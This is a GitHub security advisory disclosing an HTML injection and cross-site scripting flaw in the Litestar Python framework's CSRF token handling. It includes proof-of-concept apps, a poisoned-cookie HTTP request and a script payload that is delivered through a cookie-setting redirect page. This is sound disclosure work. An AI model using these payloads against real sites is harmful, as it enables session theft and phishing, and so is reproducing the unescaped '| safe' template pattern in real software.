# [H] Litestar has HTML Injection Through its CSRF Token

## Summary
Severity: High
Advisory: GHSA-542p-wvx7-72m4
CVE: CVE-2026-48060
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-10
Source: https://github.com/advisories/GHSA-542p-wvx7-72m4
Type: github-advisory

## Affected
- PyPI: `litestar` — affected >=0 <2.22.0

## Details
# Overview

Litestar instances which use a template engine in conjunction with CSRF protection are vulnerable to HTML Injection which can be escalated to Cross Site Scripting due to the contents of the CSRF cookie being excluded from automatic escaping by the template engine when configured inline with documentation recommendations.

We used the latest Litestar version available via PyPI for this disclosure. At the time of writing, that is version 2.21.0 and we have not validated this against the current latest commit on the main branch.

# Special Configurations Required

For a web application to be vulnerable to this issue, it must:

- Use templates to render the content which is returned to the user (e.g. Jinja, Mako, MiniJinja)
- Have CSRF protection enabled
- Have CSRF inputs enabled (i.e. a hidden form field which contains the CSRF token)

**Links to relevant documentation for the above configurations:**

- https://docs.litestar.dev/2/usage/templating.html
- https://docs.litestar.dev/latest/usage/middleware/builtin-middleware.html#csrf
- https://docs.litestar.dev/latest/usage/templating.html#adding-csrf-inputs

# Reproduction Steps

1. Visit an application which contains a form, uses templating, has CSRF protection enabled, and which inserts the CSRF token as a hidden `input` field on forms. A proof of concept application demonstrating this configuration is included later in this disclosure for ease of reproduction.
2. Observe that the server sets the `csrftoken` cookie when the page loads.

<img width="1152" height="372" alt="litestar_csrf_cookie_in_browser_dev_tools" src="https://github.com/user-attachments/assets/252a5746-0f5f-4c78-9b9c-3ff4fb98e942" />

3. Set the value of the `csrftoken` cookie to `"><h1>HTML Injection Test</h1>`.

<img width="1142" height="426" alt="litestar_csrf_cookie_poisoned_with_html" src="https://github.com/user-attachments/assets/131e5015-e718-4539-8d03-969e81a34fdc" />

4. Refresh the page.
5. Observe that the contents of the cookie is rendered on the page. 

<img width="1152" height="480" alt="litestar_successful_html_injection" src="https://github.com/user-attachments/assets/c997f679-7111-4620-a28d-25eabea34ca2" />

# Exploit Code

There are two Proof-of-Concepts (PoC) included here. The first demonstrates that arbitrary HTML is injected into the page when the user supplies a malicious `csrftoken` cookie. The second demonstrates how an attacker could deliver an attack using the vulnerability to an unsuspecting user. 

The proof-of-concept applications can be started using these commands:

```bash
# run poc1
python -m uvicorn poc1:app

# run poc2
python -m uvicorn poc2:app
```

## PoC 1 - Minimum Vulnerable Application

This proof-of-concept demonstrates that a crafted `csrftoken` cookie will be rendered on the vulnerable page as HTML. 

**poc1.py**

```python
from litestar import Litestar, get, MediaType
from litestar.response import Template
from litestar.config.csrf import CSRFConfig
import jinja2, os
from pathlib import Path
from litestar import Litestar
from litestar.contrib.jinja import JinjaTemplateEngine
from litestar.template.config import TemplateConfig

@get("/")
async def hello_world() -> Template:
    return Template(
        template_name="test.jinja",
        media_type=MediaType.HTML,
    )

ENVIRONMENT = jinja2.Environment(
    loader=jinja2.FileSystemLoader(
        searchpath=os.path.join(os.path.dirname(__file__), "templates")
    ),
    autoescape=True,
)

csrf_config = CSRFConfig(secret="my_super_duper_secret")

app = Litestar(
    route_handlers=[hello_world],
    template_config=TemplateConfig(
        directory=Path("templates"),
        engine=JinjaTemplateEngine.from_environment(ENVIRONMENT),
    ),
    csrf_config=csrf_config,
)
```

**test.jinja**

```html
<html>
    <body>
        <div>
            <form method="post">
                {{ csrf_input | safe }}
                <label for="fname">Username:</label><br>
                <input type="text" id="username" name="username"><br>
                <label for="lname">Password:</label><br>
                <input type="text" id="password" name="password">
                <input type="submit">
            </form>
        </div>
    </body>
</html>
```

Sending the following request to the vulnerable page will result in the HTML included in the `csrftoken` cookie being injected and rendered on the page. 

```http
GET /vulnerable HTTP/1.1
Host: localhost:8000
Cookie: csrftoken="><h1>HTML Injection Test</h1>
```

<img width="577" height="328" alt="litestar_html_injection_poc_result" src="https://github.com/user-attachments/assets/69590b08-1066-487d-ac37-62f64333de5a" />

## PoC 2 - Simulated Attack Delivery

This proof-of-concept demonstrates how an attacker could deliver an attack using this vulnerability to an unsuspecting user. We are using this example as it provides for easy local reproduction, it is possible that in end applications there may be various ways to trigger this vulnerability which differ from the example provided. 

First, the user must visit a malicious application (the `/first_site` endpoint in `poc2.py`) which sets the `csrftoken` cookie value to a malicious payload. This app must be hosted on the *same top level domain* as the vulnerable application so that the poisoned cookie will automatically be sent by the user's browser to the vulnerable page. 

Next, the malicious app *redirects* the user to the vulnerable app (the `/second_site` endpoint in `poc2.py`). The victim's browser will automatically send the poisoned cookie to the vulnerable app. This causes the vulnerable application to unsafely write the cookie content to the page and return it to the user, executing the attack in the victim user's browser

**poc2.py**

```python
from litestar import Litestar, get, post, MediaType
from litestar.response import Template
from litestar.config.csrf import CSRFConfig
from litestar.datastructures import Cookie
import jinja2, os
from pathlib import Path
from litestar import Litestar
from litestar.contrib.jinja import JinjaTemplateEngine
from litestar.template.config import TemplateConfig

cookie_payload = '"><script>alert(document.domain)</script>'

# malicious site which poisons the csrf cookie
@get("/first_site", response_cookies=[Cookie(key="csrftoken", value=cookie_payload, httponly=True)])
async def first_site() -> Template:
    return Template(
        template_name="page1.jinja",
        media_type=MediaType.HTML,
    )

# vulnerable site
@get("/second_site")
async def second_site() -> Template:
    return Template(
        template_name="page2.jinja",
        media_type=MediaType.HTML,
    )

# example function for form submission if csrf verification succeeds
@post("/form_receive")
async def handle_form() -> dict[str, str]:
    return {
        "message": "form data received successfully"
    }


ENVIRONMENT = jinja2.Environment(
    loader=jinja2.FileSystemLoader(
        searchpath=os.path.join(os.path.dirname(__file__), "templates")
    ),
    autoescape=True,
)

csrf_config = CSRFConfig(secret="my_super_duper_secret")

app = Litestar(
    route_handlers=[first_site, second_site, handle_form],
    template_config=TemplateConfig(
        directory=Path("templates"),
        engine=JinjaTemplateEngine.from_environment(ENVIRONMENT),
    ),
    csrf_config=csrf_config,
)
```

**page1.jinja**

```html
<html>
    <body>
        <h1>Setting cookie...</h1>
        <script>
            setTimeout(() => {
                window.location.href="/second_site"
            }, 2000);
        </script>
    </body>
</html>
```

**page2.jinja**

```html
<html>
    <body>
        <div>
            <form action="/form_receive" method="post">
                {{ csrf_input | safe }}
                <label for="fname">Username:</label><br>
                <input type="text" id="username" name="username"><br>
                <label for="lname">Password:</label><br>
                <input type="text" id="password" name="password">
                <input type="submit">
            </form>
        </div>
    </body>
</html>
```

<img width="887" height="223" alt="litestar_poc_first_page_setting_cookie" src="https://github.com/user-attachments/assets/4e8f70e4-fb44-47f6-8e15-42b512cc224f" />

<img width="885" height="366" alt="litestar_poc_second_page_xss" src="https://github.com/user-attachments/assets/a8d57c66-0424-483c-ac92-4694d4e08500" />

# Impact

This vulnerability affects all Litestar instances that use templates along with CSRF protection that has been configured inline with the documentation section of "Adding CSRF inputs" within the "Templating" page. An attacker that can successfully exploit this issue can inject arbitrary HTML tags into the page which is then rendered in the victim user's browser. This includes `script` tags, allowing the attacker to escalate the attack to a Cross Site Scripting attack, thus executing arbitrary JavaScript code in the victim's browser. 

Depending on the configuration of the site, this could result in the theft of cookies or session tokens. This issue can also allow the attacker to change the appearance of the site. This could enable possible phishing attacks by injecting fake forms into the page or even skimming the information that a user enters into a legitimate form. 

# Resources

- https://cwe.mitre.org/data/definitions/79.html
- https://docs.litestar.dev/2/usage/templating.html
- https://docs.litestar.dev/latest/usage/middleware/builtin-middleware.html#csrf
- https://docs.litestar.dev/latest/usage/templating.html#adding-csrf-inputs

## References
- https://github.com/litestar-org/litestar/security/advisories/GHSA-542p-wvx7-72m4
- https://docs.litestar.dev/2/release-notes/changelog.html#2.22.0
- https://github.com/litestar-org/litestar
